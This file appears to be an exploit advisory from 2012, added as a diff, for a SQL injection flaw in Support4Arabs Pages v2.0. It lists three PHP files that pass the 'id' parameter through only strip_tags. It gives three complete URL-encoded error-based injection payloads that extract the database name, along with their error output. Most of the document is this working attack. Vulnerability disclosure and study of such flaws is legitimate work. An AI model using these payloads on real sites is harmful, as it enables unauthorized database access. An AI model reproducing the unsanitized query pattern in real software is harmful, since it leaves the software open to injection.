@@ -1,0 +1,47 @@
+############################################
+### Exploit Title: Support4Arabs Pages v2.0 Remote SQL Error Based Injection Vulnerability
+### Date: 04/9/2012 
+### Author: L0n3ly-H34rT 
+### Contact: l0n3ly_h34rt@hotmail.com 
+### My Site: http://se3c.blogspot.com/ 
+### Vendor Link: http://www.support4arabs.com/
+### Software Link: http://www.traidnt.net/vb/attachments/485227d1274185475-traidnt.zip
+### Version: 2.0
+### Tested on: Linux/Windows 
+############################################
+
+# Files affected :
+
+1- pages.php :
+
+$id = strip_tags($_GET['id']); 
+
+2- categories.php :
+
+$id = strip_tags($_GET['id']); 
+
+3- news.php :
+
+$id = strip_tags($_GET['id']); 
+
+# Examples :
+
+http://127.0.0.1/pages/pages.php?do=pages&id=1%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28database%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+%60information_schema%60.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+%60information_schema%60.tables+group+by+x%29a%29+and+%271%27%3D%271
+
+http://127.0.0.1/pages/categories.php?id=1%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28database%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+%60information_schema%60.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+%60information_schema%60.tables+group+by+x%29a%29+and+%271%27%3D%271
+
+http://127.0.0.1/pages/news.php?do=news&id=1%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28database%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+%60information_schema%60.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+%60information_schema%60.tables+group+by+x%29a%29+and+%271%27%3D%271
+
+# The results is :
+
+Duplicate entry '~'pagesv10'~1' for key 'group_key'
+
+# This for example and the name of database is: pagesv10 ...
+
+############################################
+
+# Note :
+
+Must be magic_quotes_gpc = Off
+
+# Greetz to my friendz
